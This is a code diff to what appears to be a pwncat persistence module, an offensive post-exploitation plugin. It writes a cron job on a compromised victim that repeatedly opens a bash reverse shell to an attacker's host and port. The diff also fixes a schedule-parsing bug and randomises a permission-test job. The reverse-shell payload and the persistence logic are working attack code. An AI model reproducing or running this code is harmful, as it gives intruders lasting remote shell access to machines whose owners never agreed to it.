@@ -1,4 +1,4 @@
-import os, pwncat
+import os, pwncat, random
 from crontab import CronTab
 from cron_descriptor import get_description, ExpressionDescriptor
 from pwncat.modules import Argument, Status, PersistType, PersistError
@@ -31,8 +31,9 @@ class Module(PersistModule):
             if shell == "current":
                 shell = pwncat.victim.shell
             try:
+                randint = random.randint(1024, 65535)
                 cron = CronTab(user=True)
-                job = cron.new(command='echo hello_world')
+                job = cron.new(command='echo ' + str(randint))
                 job.minute.every(1)
                 cron.write()
             except (PermissionError) as exc:
@@ -44,18 +45,18 @@ class Module(PersistModule):
                 payload = str("bash -c 'bash -i > /dev/tcp/" + rhost.strip() + "/" + rport.strip() + " 2>&1'")
                 job = cron.new(command=payload)
                 c = 0
-                for number in cron.split():
+                for number in schedule.split():
                     if number != str("*"):
                         if c == 0:
-                            job.minute.every(cron.split()[0]) # 0-59
+                            job.minute.every(schedule.split()[0]) # 0-59
                         if c == 1:
-                            job.hour.every(cron.split()[1]) # 0-23
+                            job.hour.every(schedule.split()[1]) # 0-23
                         if c == 2:
-                            job.day.on(cron.split()[2]) # 1-31
+                            job.day.on(schedule.split()[2]) # 1-31
                         if c == 3:
-                            job.month.on(cron.split()[3]) # 1-12
+                            job.month.on(schedule.split()[3]) # 1-12
                         if c == 4:
-                            job.dow.on(cron.split()[4]) # 0-6 (0 = Sunday)
+                            job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
                         c += 1
                     # if number = * then do not set, the crontab module assumes that as default
                 cron.write()
